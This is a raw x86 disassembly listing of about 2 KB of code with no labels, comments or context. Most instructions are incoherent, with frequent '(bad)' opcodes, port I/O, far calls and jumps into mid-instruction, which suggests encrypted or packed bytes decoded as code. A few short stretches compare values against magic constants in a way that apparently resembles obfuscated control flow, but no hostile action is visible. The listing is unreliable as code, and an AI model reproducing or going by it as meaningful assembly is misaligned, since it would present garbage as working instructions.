  408230:	fisttp DWORD PTR ds:0xf1fff528
  408236:	inc    edi
  408237:	mov    ds:0x14535c12,al
  40823c:	inc    edx
  40823d:	inc    eax
  40823e:	sbb    al,0x62
  408240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408241:	ret    
  408242:	jo     0x408218
  408244:	pop    ecx
  408245:	dec    esi
  408246:	add    esp,esp
  408248:	das    
  408249:	scas   al,BYTE PTR es:[edi]
  40824a:	test   dh,cl
  40824c:	popf   
  40824d:	jbe    0x4082bb
  40824f:	push   0x78687956
  408254:	mov    ebp,DWORD PTR [esi+0x33]
  408257:	add    al,0x69
  408259:	push   ds
  40825a:	lods   al,BYTE PTR ds:[esi]
  40825b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40825c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40825d:	test   eax,0xa931569b
  408262:	in     al,dx
  408263:	cmp    BYTE PTR [edx+0x56],bh
  408266:	es fs aam 0xc8
  40826a:	jle    0x408212
  40826c:	popf   
  40826d:	(bad)  
  40826e:	xlat   BYTE PTR ds:[ebx]
  40826f:	mov    esi,0xfe80de5e
  408274:	lods   eax,DWORD PTR ds:[esi]
  408275:	mul    DWORD PTR [eax+0x7371230f]
  40827b:	shr    BYTE PTR [ecx],0x6b
  40827e:	mov    al,ds:0x5f8fd421
  408283:	(bad)  
  408284:	imul   ecx,DWORD PTR [ecx-0x47],0xb2aeecd3
  40828b:	sbb    DWORD PTR [esi],esi
  40828d:	and    DWORD PTR ss:[esi+ebx*2-0x2032be3e],0xffffffce
  408296:	push   ds
  408297:	ret    
  408298:	xchg   esi,eax
  408299:	jmp    0x45a3be2e
  40829e:	mov    dh,0x1
  4082a0:	mov    cl,BYTE PTR [esi]
  4082a2:	out    0xa4,eax
  4082a4:	and    DWORD PTR [ecx],eax
  4082a6:	jns    0x408313
  4082a8:	sti    
  4082a9:	adc    eax,0x8cec2f7b
  4082ae:	cwde   
  4082af:	sub    BYTE PTR [edi],ch
  4082b1:	jecxz  0x4082a1
  4082b3:	dec    edx
  4082b4:	aad    0x6
  4082b6:	nop
  4082b7:	popa   
  4082b8:	fidivr DWORD PTR [ebp-0x31d272b1]
  4082be:	(bad)  
  4082bf:	ins    BYTE PTR es:[edi],dx
  4082c0:	xor    eax,0xf49e4181
  4082c5:	sbb    al,0x4e
  4082c7:	fist   WORD PTR [edx-0x162e4253]
  4082cd:	pushf  
  4082ce:	(bad)  
  4082cf:	iret   
  4082d0:	adc    ebx,DWORD PTR [esi+0x4f]
  4082d3:	scas   al,BYTE PTR es:[edi]
  4082d4:	sub    al,0xd9
  4082d6:	mov    edx,0x4ba25504
  4082db:	mul    DWORD PTR [ebx-0xd]
  4082de:	jb     0x40826b
  4082e0:	(bad)  
  4082e1:	popf   
  4082e2:	pop    ds
  4082e3:	shl    dl,0xb6
  4082e6:	leave  
  4082e7:	scas   al,BYTE PTR es:[edi]
  4082e8:	ds jno 0x4082c8
  4082eb:	xor    eax,DWORD PTR [edi+edi*8]
  4082ee:	es inc ecx
  4082f0:	(bad)  
  4082f1:	out    dx,eax
  4082f2:	mov    ah,0x60
  4082f4:	xor    eax,0xd23b9b5a
  4082f9:	sbb    DWORD PTR [edx],ebx
  4082fb:	xchg   ebp,eax
  4082fc:	in     al,0xe7
  4082fe:	and    bh,BYTE PTR [eax]
  408300:	or     ah,ah
  408302:	adc    al,BYTE PTR [esi]
  408304:	dec    eax
  408305:	mov    edx,0x92bf7c72
  40830a:	aaa    
  40830b:	test   BYTE PTR ss:[eax-0x37],bl
  40830f:	inc    eax
  408310:	and    al,BYTE PTR [eax+edx*4+0x39]
  408314:	xor    BYTE PTR [ebp-0x65b765b5],bh
  40831a:	adc    bh,bh
  40831c:	sti    
  40831d:	pop    ecx
  40831e:	mov    BYTE PTR [esi+edx*4],bh
  408321:	test   al,0xf6
  408323:	imul   edi,ebx,0xa9b16d4d
  408329:	(bad)  
  40832a:	dec    edx
  40832b:	xchg   edi,eax
  40832c:	mov    bh,0x6d
  40832e:	jmp    0x34678ff1
  408333:	adc    bh,BYTE PTR [ebx-0x398f4a]
  408339:	in     al,0xb8
  40833b:	scas   eax,DWORD PTR es:[edi]
  40833c:	call   0x3d96:0xf0c38a94
  408343:	xlat   BYTE PTR ds:[ebx]
  408344:	sbb    eax,DWORD PTR [eax+0x40]
  408347:	add    eax,0xffffffe6
  40834a:	ins    DWORD PTR es:[edi],dx
  40834b:	(bad)  
  40834c:	mov    DWORD PTR [edx+0x62],ebx
  40834f:	inc    edi
  408350:	call   0x8630:0xdd050619
  408357:	add    al,0x90
  408359:	aaa    
  40835a:	xchg   eax,esi
  40835c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40835d:	sbb    esi,DWORD PTR [ebx-0x7567cd6f]
  408363:	inc    esi
  408364:	cmp    eax,0xa4acaec7
  408369:	imul   ebp,esi,0xffffffa7
  40836c:	ja     0x408307
  40836e:	daa    
  40836f:	ret    
  408370:	outs   dx,DWORD PTR ds:[esi]
  408371:	pop    DWORD PTR [ecx]
  408373:	test   DWORD PTR es:[eax-0x31bf0444],ecx
  40837a:	out    dx,eax
  40837b:	mov    ecx,0x5e2456ef
  408380:	mov    eax,ds:0xc6e69141
  408385:	mov    al,0x2e
  408387:	test   bl,ch
  408389:	fistp  DWORD PTR [ebx+0x21]
  40838c:	das    
  40838d:	xchg   ebx,eax
  40838e:	div    esi
  408390:	pop    ebp
  408391:	mov    ds:0xc76eddf3,al
  408396:	pusha  
  408397:	dec    ebp
  408398:	call   0x360bbaa
  40839d:	shr    BYTE PTR [eax],0x81
  4083a0:	xor    edx,DWORD PTR [edx]
  4083a2:	dec    bp
  4083a4:	xor    dh,BYTE PTR [edx+ebp*8]
  4083a7:	inc    ebx
  4083a8:	adc    esp,eax
  4083aa:	out    dx,eax
  4083ab:	push   cs
  4083ac:	mov    ds:0x1b757f0a,eax
  4083b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083b2:	shl    cl,1
  4083b4:	mov    esi,0xcf0eb5aa
  4083b9:	mov    BYTE PTR [edx-0x2d],0xf0
  4083bd:	inc    edi
  4083be:	xlat   BYTE PTR ds:[ebx]
  4083bf:	dec    esp
  4083c0:	xchg   ebp,eax
  4083c1:	cs push 0x4bc54ad9
  4083c7:	in     al,dx
  4083c8:	pop    eax
  4083c9:	data16 mov bh,0x34
  4083cc:	inc    ecx
  4083cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083ce:	dec    esp
  4083cf:	scas   eax,DWORD PTR es:[edi]
  4083d0:	das    
  4083d1:	test   eax,0x2fab6b4
  4083d6:	daa    
  4083d7:	loope  0x408384
  4083d9:	neg    dh
  4083db:	adc    BYTE PTR [ebp+0x6f],dl
  4083de:	cmp    esi,DWORD PTR [eax+0x76738db0]
  4083e4:	sub    al,0xb4
  4083e6:	aam    0xe4
  4083e8:	mov    esi,0x94ed6d8d
  4083ed:	iret   
  4083ee:	stos   BYTE PTR es:[edi],al
  4083ef:	mov    eax,ds:0x2aadf05e
  4083f4:	add    eax,0xb63aa938
  4083f9:	adc    BYTE PTR [ecx],bl
  4083fb:	std    
  4083fc:	loope  0x408416
  4083fe:	or     ah,BYTE PTR [ecx+0x3a91bf9f]
  408404:	or     BYTE PTR [esi*4+0x423cfc00],al
  40840b:	or     BYTE PTR [edi],0x1f
  40840e:	std    
  40840f:	ds xchg ebp,eax
  408411:	sbb    esi,DWORD PTR es:[edx+0x79]
  408415:	ffreep st(6)
  408417:	mov    bh,BYTE PTR [esi+esi*8+0x74]
  40841b:	js     0x4083bf
  40841d:	out    dx,al
  40841e:	dec    ebx
  40841f:	push   ebp
  408420:	pop    eax
  408421:	dec    eax
  408422:	cmp    ebp,DWORD PTR [edx+ecx*8]
  408425:	mov    al,ds:0x3ec2c161
  40842a:	cdq    
  40842b:	xchg   ebx,eax
  40842c:	dec    ebx
  40842d:	add    eax,0x1755fb54
  408432:	rcr    dh,0xa2
  408435:	pop    ds
  408436:	jecxz  0x408488
  408438:	in     al,dx
  408439:	test   BYTE PTR [esi+esi*4-0xf],ah
  40843d:	arpl   ax,dx
  40843f:	xchg   esp,eax
  408440:	sub    BYTE PTR [eax-0x69],bh
  408443:	ss stos BYTE PTR es:[edi],al
  408445:	fstp   QWORD PTR [esi]
  408447:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408449:	fdiv   st,st(1)
  40844b:	sub    eax,0xeca1cbb5
  408450:	(bad)  
  408451:	jmp    0x6d32:0xf1e44068
  408458:	(bad)  
  40845a:	push   esp
  40845b:	mov    ah,0xe1
  40845d:	lods   eax,DWORD PTR ds:[esi]
  40845e:	push   ebp
  40845f:	pusha  
  408460:	loopne 0x408459
  408462:	(bad)
  408466:	pop    edi
  408467:	cmp    BYTE PTR [edi+ebp*8+0x58],dl
  40846b:	ins    DWORD PTR es:[edi],dx
  40846c:	fwait
  40846d:	mov    dh,0x42
  40846f:	push   ds
  408470:	mov    DWORD PTR [esi],edx
  408472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408473:	repnz fwait
  408475:	or     DWORD PTR [edx+0x3e],0x370e7931
  40847c:	lds    ecx,FWORD PTR [esi-0x19f3c9b0]
  408482:	lock jnp 0x40845b
  408485:	sub    eax,0x7e664660
  40848a:	int    0x18
  40848c:	ins    DWORD PTR es:[edi],dx
  40848d:	add    ecx,edx
  40848f:	ret    0xb001
  408492:	cmc    
  408493:	ret    0xd17e
  408496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408497:	imul   edi,DWORD PTR [ebx],0xffffff82
  40849a:	imul   ebx,DWORD PTR [esi-0x64b9a056],0x86f94c4e
  4084a4:	mov    ch,0x30
  4084a6:	ss scas al,BYTE PTR es:[edi]
  4084a8:	fld    QWORD PTR [edx-0x4cd97bd7]
  4084ae:	pop    ecx
  4084af:	pushf  
  4084b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084b1:	push   0x7e0d8dfd
  4084b6:	daa    
  4084b7:	imul   esi,DWORD PTR [edi-0x7ba7407],0xc603c133
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	aam    0x55
  408510:	adc    BYTE PTR [ebx],al
  408512:	xor    bl,dh
  408514:	jl     0x408592
  408516:	xlat   BYTE PTR ds:[ebx]
  408517:	jns    0x408595
  408519:	jl     0x40857c
  40851b:	imul   BYTE PTR [ebp+0x58]
  40851e:	mov    eax,DWORD PTR [edi-0x2284ce7]
  408524:	int    0xcf
  408526:	jp     0x408587
  408528:	sub    cl,BYTE PTR [ebp+0xd27d8be]
  40852e:	ret    
  40852f:	push   0xd34a94bc
  408534:	aas    
  408535:	xlat   BYTE PTR ds:[ebx]
  408536:	push   es
  408537:	and    edx,ebp
  408539:	and    BYTE PTR [edx-0x127b6806],dh
  40853f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408540:	icebp  
  408541:	popf   
  408542:	arpl   WORD PTR [ebx-0x4a],dx
  408545:	sub    esp,DWORD PTR [ebx+0x57]
  408548:	mov    bh,0x3e
  40854a:	out    dx,al
  40854b:	sbb    BYTE PTR [eax+0x12],ah
  40854e:	out    dx,eax
  40854f:	in     eax,0x57
  408551:	dec    edi
  408552:	pop    eax
  408553:	mov    BYTE PTR ds:0x85dbc5a1,cl
  408559:	mov    dl,0xa9
  40855b:	dec    eax
  40855c:	test   BYTE PTR [ecx-0x65],0x39
  408560:	pop    edx
  408561:	xchg   edx,eax
  408562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408563:	mov    dh,0x13
  408565:	mov    bh,0x50
  408567:	outs   dx,BYTE PTR ds:[esi]
  408568:	dec    edi
  408569:	mov    dh,0xd8
  40856b:	minps  xmm0,XMMWORD PTR [ebp-0x72]
  40856f:	aaa    
  408570:	or     al,0xc3
  408572:	mov    ch,0xff
  408574:	mov    ebx,0x44046402
  408579:	mov    bh,0xce
  40857b:	mov    dl,0x45
  40857d:	mov    BYTE PTR [ebp-0x42],cl
  408580:	dec    eax
  408581:	loope  0x40853c
  408583:	bound  ecx,QWORD PTR [ebx]
  408585:	or     eax,0xb9216faa
  40858a:	or     esp,ebx
  40858c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40858d:	push   ss
  40858e:	aas    
  40858f:	and    edx,ecx
  408591:	test   eax,0xdfbe7f0b
  408596:	adc    BYTE PTR [eax+0x47537788],cl
  40859c:	pop    ecx
  40859d:	jmp    0x4085cc
  40859f:	lds    ebp,FWORD PTR [ebx-0x76]
  4085a2:	sub    esi,eax
  4085a4:	pusha  
  4085a5:	outs   dx,DWORD PTR ds:[esi]
  4085a6:	jbe    0x4085a9
  4085a8:	jbe    0x408576
  4085aa:	push   esi
  4085ab:	out    0xc0,al
  4085ad:	cmp    al,0xc5
  4085af:	add    DWORD PTR [ebp-0x59e56c7e],esi
  4085b5:	add    eax,0xe6e6ee43
  4085ba:	inc    esp
  4085bb:	jle    0x4085a9
  4085bd:	or     BYTE PTR [esi-0x41],ch
  4085c0:	xchg   esi,eax
  4085c1:	addr16 (bad) 
  4085c3:	jge    0x4085ee
  4085c5:	call   0xf955e9a5
  4085ca:	fyl2xp1 
  4085cc:	or     DWORD PTR [edi],0x4f
  4085cf:	xlat   BYTE PTR ss:[ebx]
  4085d1:	lods   al,BYTE PTR ds:[esi]
  4085d2:	pop    ds
  4085d3:	das    
  4085d4:	in     eax,0x1b
  4085d6:	push   es
  4085d7:	cwde   
  4085d8:	loope  0x4085b0
  4085da:	test   BYTE PTR [ebp+0x592e41bc],ah
  4085e0:	add    eax,0x4f660508
  4085e5:	push   eax
  4085e6:	pop    ecx
  4085e7:	mov    dl,0x24
  4085e9:	mov    esp,0xc622f643
  4085ee:	fimul  WORD PTR [ebp-0x4a]
  4085f1:	iret   
  4085f2:	sub    al,0x3f
  4085f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085f5:	sbb    eax,0x35de4620
  4085fa:	retf   
  4085fb:	mov    DWORD PTR [ebx-0x69828f6c],eax
  408601:	xor    al,BYTE PTR [edi]
  408603:	fwait
  408604:	jl     0x408679
  408606:	inc    edi
  408607:	mov    WORD PTR [esi-0x11e35dac],?
  40860d:	inc    esp
  40860e:	fucomp st(3)
  408610:	push   edi
  408611:	mov    ebx,0x94ae3ff1
  408616:	cmp    cl,ch
  408618:	pop    edx
  408619:	test   al,0xa1
  40861b:	mov    ecx,0x28002ecf
  408620:	add    DWORD PTR [esi],edx
  408622:	ins    BYTE PTR es:[edi],dx
  408623:	adc    DWORD PTR [edx+edi*1-0x7c],esi
  408627:	scas   eax,DWORD PTR es:[edi]
  408628:	or     al,0x7a
  40862a:	leave  
  40862b:	std    
  40862c:	les    esi,FWORD PTR [edi-0x1dcf8083]
  408632:	int    0xad
  408634:	xchg   edi,eax
  408635:	not    eax
  408637:	cmp    DWORD PTR [edx+ebp*4-0xe917952],ebp
  40863e:	data16 stc 
  408640:	push   0x39
  408642:	jge    0x408658
  408644:	in     eax,0xe0
  408646:	mov    ecx,0x99f2b1ed
  40864b:	test   ebp,ebp
  40864d:	js     0x4085d2
  40864f:	lods   eax,DWORD PTR ds:[esi]
  408650:	inc    eax
  408651:	xchg   edx,eax
  408652:	in     eax,dx
  408653:	mov    eax,0x83a1e07b
  408658:	(bad)  
  408659:	sahf   
  40865a:	push   edi
  40865b:	popa   
  40865c:	in     eax,dx
  40865d:	pop    ebx
  40865e:	mov    ecx,0x9fb865d1
  408663:	add    DWORD PTR [ecx],esp
  408665:	retf   
  408666:	ins    DWORD PTR es:[edi],dx
  408667:	cmove  ebp,DWORD PTR [edi+ebx*2+0x42]
  40866c:	jl     0x408637
  40866e:	clc    
  40866f:	icebp  
  408670:	rol    BYTE PTR [esi-0x5bb50eaf],cl
  408676:	jo     0x4086e6
  408678:	pop    esi
  408679:	loop   0x4086b4
  40867b:	sti    
  40867c:	out    0x1e,eax
  40867e:	lahf   
  40867f:	jo     0x408633
  408681:	inc    ebp
  408682:	gs mov ecx,ebp
  408685:	test   BYTE PTR [edx+0x64b1fa0d],bh
  40868b:	mov    ecx,0x9b648446
  408690:	lds    esi,FWORD PTR [ebx-0x17]
  408693:	outs   dx,DWORD PTR ds:[esi]
  408694:	sub    ecx,DWORD PTR ds:0x34f6999b
  40869a:	inc    eax
  40869b:	add    bl,ch
  40869d:	les    esp,FWORD PTR [ebx+0x68]
  4086a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086a1:	or     al,0x37
  4086a3:	(bad)  
  4086a4:	lea    eax,[eax-0x7e]
  4086a7:	adc    BYTE PTR [edi+0x1f928d70],dl
  4086ad:	clc    
  4086ae:	out    0x5a,al
  4086b0:	test   BYTE PTR [eax],0xb5
  4086b3:	mov    esp,DWORD PTR [ebp-0xf3452d9]
  4086b9:	popa   
  4086ba:	xchg   ebp,eax
  4086bb:	or     cl,BYTE PTR [edi]
  4086bd:	fistp  WORD PTR [ebx-0x43d863ac]
  4086c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086c4:	jge    0x4086b3
  4086c6:	push   esi
  4086c7:	inc    ebx
  4086c8:	and    DWORD PTR [esi+0x1b5d2310],edx
  4086ce:	js     0x40874e
  4086d0:	inc    ebx
  4086d1:	sbb    bh,BYTE PTR [esi+edi*4+0x57]
  4086d5:	arpl   WORD PTR [ecx],bp
  4086d7:	out    0x68,eax
  4086d9:	clc    
  4086da:	or     dh,0x8
  4086dd:	dec    esi
  4086de:	repnz pop ecx
  4086e0:	pop    ebx
  4086e1:	pop    esi
  4086e2:	mov    esp,0x879ed2b1
  4086e7:	or     eax,DWORD PTR [ecx+0x33]
  4086ea:	stc    
  4086eb:	arpl   WORD PTR [edi+0x108e3f7],di
  4086f1:	xchg   DWORD PTR [edx],eax
  4086f3:	call   0x1fc2988c
  4086f8:	adc    al,0x85
  4086fa:	xchg   al,ch
  4086fc:	cld    
  4086fd:	inc    eax
  4086fe:	enter  0xe913,0xce
  408702:	dec    ebx
  408703:	jne    0x40872f
  408705:	sti    
  408706:	sub    esi,DWORD PTR ss:[ecx+edi*1+0x526b445e]
  40870e:	mov    eax,0x233a0685
  408713:	(bad)  
  408714:	not    BYTE PTR [edi+0x28]
  408717:	fwait
  408718:	inc    ebp
  408719:	fdivrp st(2),st
  40871b:	aaa    
  40871c:	lea    ebx,[ebp-0x13]
  40871f:	push   ds
  408720:	add    DWORD PTR [ebp-0x7ae71420],ebp
  408726:	push   ecx
  408727:	xor    al,0x0
  408729:	rol    DWORD PTR [eax+ebx*2-0x48e0a1b7],cl
  408730:	xchg   esi,eax
  408731:	mov    edx,0xe81a4677
  408736:	rcr    DWORD PTR [esi+0x4947b7cb],0x88
  40873d:	xor    ecx,DWORD PTR [eax+0x8f2d5f4]
  408743:	aas    
  408744:	pop    eax
  408745:	add    bh,BYTE PTR [ebx+ebp*1]
  408748:	cmp    eax,0x36e6217f
  40874d:	jne    0x408775
  40874f:	call   0xeae1:0x165b3b59
  408756:	mov    DWORD PTR [esi+0x1f],eax
  408759:	push   eax
  40875a:	dec    ecx
  40875b:	cmp    dl,ch
  40875d:	pop    esp
  40875e:	sbb    ah,cl
  408760:	mov    edi,0xca5e382e
  408765:	data16 in al,dx
  408767:	mov    ah,0xbd
  408769:	xchg   esp,eax
  40876a:	dec    edi
  40876b:	dec    esi
  40876c:	or     eax,0x178c5e91
  408771:	mov    edx,0xa5a4d4a6
  408776:	cmp    al,0x61
  408778:	in     al,dx
  408779:	jg     0x4087d7
  40877b:	out    0x80,al
  40877d:	fmul   DWORD PTR [esi+edx*1]
  408780:	jp     0x4087ed
  408782:	stos   BYTE PTR es:[edi],al
  408783:	shl    DWORD PTR [edx+0x326bbfaa],1
  408789:	cmp    eax,0x24680e43
  40878e:	inc    eax
  40878f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408790:	push   ss
  408791:	push   edi
  408792:	xchg   ecx,eax
  408793:	lods   al,BYTE PTR ds:[esi]
  408794:	cld    
  408795:	sub    BYTE PTR [esi],ch
  408797:	pop    ebx
  408798:	pop    eax
  408799:	jb     0x408815
  40879b:	call   0xe4f4:0x17d08536
  4087a2:	jne    0x408759
  4087a4:	loopne 0x408822
  4087a6:	inc    esp
  4087a7:	pop    esp
  4087a8:	iret   
  4087a9:	mov    esi,0xfd01eb44
  4087ae:	sbb    al,0xd5
  4087b0:	jge    0x4087de
  4087b2:	call   0x423c:0x3fe74ad5
  4087b9:	jns    0x40876c
  4087bb:	mov    eax,ds:0x3c58ba75
  4087c0:	pop    edi
  4087c1:	mov    dl,0xc
  4087c3:	mov    ds:0x22d86b0b,eax
  4087c8:	(bad)  
  4087c9:	or     DWORD PTR [esp+ebx*1],edi
  4087cc:	or     esi,ebp
  4087ce:	popa   
  4087cf:	sub    DWORD PTR [edx-0x4a6006eb],ebp
  4087d5:	jns    0x4087bb
  4087d7:	fnsave [eax-0x16]
  4087da:	xchg   ebp,eax
  4087db:	jne    0x408777
  4087dd:	test   BYTE PTR [eax],dh
  4087df:	xchg   BYTE PTR [edi-0x3b],dl
  4087e2:	test   al,0xf5
  4087e4:	sahf   
  4087e5:	iret   
  4087e6:	aaa    
  4087e7:	mov    eax,ds:0xec69bc71
  4087ec:	mov    eax,0xe57c62e4
  4087f1:	rcl    DWORD PTR [eax-0x74],1
  4087f4:	(bad)  
  4087f5:	je     0x408799
  4087f7:	sub    DWORD PTR [esi-0x49df6644],edx
  4087fd:	gs pop esi
  4087ff:	js     0x408848
  408801:	mov    edx,DWORD PTR [ebp-0x4bf96355]
  408807:	inc    esp
  408808:	fldcw  WORD PTR [edx+0x46065216]
  40880e:	add    ebp,edi
  408810:	cmc    
  408811:	sar    BYTE PTR [ebx+0x310dfa6a],0x9a
  408818:	daa    
  408819:	jae    0x408835
  40881b:	pop    esp
  40881c:	pop    edi
  40881d:	loope  0x40881a
  40881f:	mov    al,ds:0x30343e39
  408824:	xor    BYTE PTR [ecx+0x6f432ee7],bl
  40882a:	(bad)  
  40882b:	ins    DWORD PTR es:[edi],dx
  40882c:	cmp    al,0xbe
  40882e:	pop    ebp
  40882f:	push   ss
  408830:	sub    ah,0x44
  408833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408834:	dec    ecx
  408835:	xchg   esi,edx
  408837:	mov    edi,fs
  408839:	out    0xb4,eax
  40883b:	xor    bl,BYTE PTR [eax]
  40883d:	sbb    dl,dh
  40883f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408840:	cmp    al,0xa0
  408842:	dec    esi
  408843:	fisub  DWORD PTR [eax*2+0x628c4cad]
  40884a:	xchg   DWORD PTR [ebp+0x3e],esi
  40884d:	test   DWORD PTR [eax-0x89dd293],edi
  408853:	pop    ebx
  408854:	cmp    ebx,DWORD PTR [esi+0x1a]
  408857:	aam    0xb
  408859:	gs jmp 0xa60c:0xea6d5bcd
  408861:	pmullw mm7,mm2
  408864:	xor    dh,al
  408866:	int    0xc
  408868:	(bad)  
  408869:	jge    0x4088b6
  40886b:	xor    dl,bh
  40886d:	xchg   edx,eax
  40886e:	mov    BYTE PTR [edi-0x1a],bh
  408871:	lods   eax,DWORD PTR ds:[esi]
  408872:	jp     0x4087f5
  408874:	xor    BYTE PTR [edi-0x16d9af06],cl
  40887a:	cmp    al,0xfc
  40887c:	(bad)  
  40887d:	jmp    DWORD PTR [esi-0x75]
  408880:	inc    ebp
  408881:	cld    
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0x2c
  4088df:	xchg   esi,eax
  4088e0:	mov    bh,0x7f
  4088e2:	xchg   ebp,eax
  4088e3:	fstp   TBYTE PTR [esp+edi*2-0x29]
  4088e7:	jns    0x408965
  4088e9:	jl     0x408897
  4088eb:	mov    fs,WORD PTR [ebx]
  4088ed:	xchg   BYTE PTR ds:0x4536d3b1,dl
  4088f3:	(bad)
  4088f6:	add    eax,0x402c1c7c
  4088fb:	pusha  
  4088fc:	dec    ebp
  4088fd:	cmp    eax,0xdbd6ba52
  408902:	pop    ebx
  408903:	or     DWORD PTR [edi+0x30],edx
  408906:	sub    ch,BYTE PTR [ebx]
  408908:	imul   ebp,esi,0x31
  40890b:	fstp   DWORD PTR [edx]
  40890d:	(bad)  [edx+0x39a598ff]
  408913:	addr16 xchg edx,eax
  408915:	xor    ecx,eax
  408917:	adc    eax,DWORD PTR [eax-0x4f]
  40891a:	or     esp,DWORD PTR [ebx-0x11]
  40891d:	push   0xffffff99
  40891f:	xor    eax,0xd99e58e8
  408924:	mov    ecx,0xf91a506a
  408929:	mov    edx,0xe29bb305
  40892e:	lea    ecx,[edi+0x9e7b74d]
  408934:	mov    eax,0xf3a9a9f6
  408939:	sub    BYTE PTR [esp+ecx*1],al
  40893c:	aam    0x5b
  40893e:	sbb    esp,DWORD PTR [eax]
  408940:	js     0x40893e
  408942:	jae    0x408959
  408944:	adc    DWORD PTR [edi-0x2a1f9083],esi
  40894a:	mov    ebx,0xffe806e9
  40894f:	iret   
  408950:	scas   eax,DWORD PTR es:[edi]
  408951:	loopne 0x408948
  408953:	jns    0x408927
  408955:	stc    
  408956:	push   ebx
  408957:	add    DWORD PTR [ecx],edx
  408959:	aad    0xa8
  40895b:	mov    ecx,0xcdea2703
  408960:	loop   0x408936
  408962:	sub    BYTE PTR [edi+0x45f89d9d],dl
  408968:	fcom   QWORD PTR [edx]
  40896a:	mov    bh,0x6d
  40896c:	inc    ecx
  40896d:	sbb    ebx,DWORD PTR [edi+0x7fa35219]
  408973:	push   0xffffff8f
  408975:	lods   al,BYTE PTR ds:[esi]
  408976:	das    
  408977:	mov    esi,0x572db241
  40897c:	cmp    DWORD PTR [ebx],0xffffffa4
  40897f:	and    al,0x5c
  408981:	mov    al,0x28
  408983:	jns    0x408971
  408985:	push   ecx
  408986:	mov    eax,0xb9072689
  40898b:	xchg   ebx,eax
  40898c:	dec    ebp
  40898d:	mov    esp,0xf6ecc815
  408992:	inc    edi
  408993:	inc    ebx
  408994:	std    
  408995:	loop   0x408957
  408997:	mov    edx,0x24180152
  40899c:	adc    al,0xe1
  40899e:	pop    esp
  40899f:	ror    BYTE PTR [ebx],cl
  4089a1:	cmc    
  4089a2:	fsubr  DWORD PTR [edx+0x48a46b3a]
  4089a8:	je     0x408955
  4089aa:	out    dx,eax
  4089ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089ac:	and    DWORD PTR [edx+0x1650e4b6],eax
  4089b2:	cld    
  4089b3:	jmp    DWORD PTR [esi+eiz*2]
  4089b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089b7:	loopne 0x4089f0
  4089b9:	inc    ebx
  4089ba:	dec    esp
  4089bb:	push   ebp
  4089bc:	scas   al,BYTE PTR es:[edi]
  4089bd:	sbb    DWORD PTR es:[ecx],ebx
  4089c0:	arpl   WORD PTR [esi+0x770120f3],dx
  4089c6:	or     BYTE PTR [esi+0x5d7df728],0xf0
  4089cd:	push   edx
  4089ce:	fwait
  4089cf:	mov    edi,0xf8585fa6
  4089d5:	sub    eax,0xf22a79a3
  4089da:	fimul  DWORD PTR [edi]
  4089dc:	dec    eax
  4089dd:	or     eax,0x29f46083
  4089e2:	cmp    eax,0xfb03035e
  4089e7:	or     DWORD PTR [ecx-0x7a],esp
  4089ea:	rcl    BYTE PTR [ecx],0xcb
  4089ed:	mov    esp,0x55adcd9f
  4089f2:	adc    eax,0xff0d6152
  4089f7:	aam    0x93
  4089f9:	xchg   esi,eax
